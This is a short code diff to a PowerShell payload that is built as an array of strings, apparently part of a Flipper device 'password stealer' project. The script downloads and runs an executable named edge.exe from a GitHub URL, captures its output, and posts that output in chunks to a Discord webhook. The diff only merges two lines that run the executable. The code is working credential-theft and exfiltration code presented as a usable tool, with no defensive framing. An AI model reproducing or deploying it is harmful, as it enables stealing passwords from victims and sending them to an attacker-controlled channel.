@@ -5,8 +5,7 @@ let script = [
     "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/edge.exe';",
     "$exePath = '.\\edge.exe';",
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
-    "$commandOutput = & $exePath;",
-    "$commandOutput = & '.\\edge.exe' | Out-String;",
+    "$commandOutput = & $exePath | Out-String;",
     "$chunks = [Math]::Ceiling($commandOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $commandOutput.Length - $start);$content = $commandOutput.Substring($start, $length);$discordData = @{'username' = 'Flipper';'content' = $content;};$jsonData = ConvertTo-Json -InputObject $discordData;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';}"
 ];
 
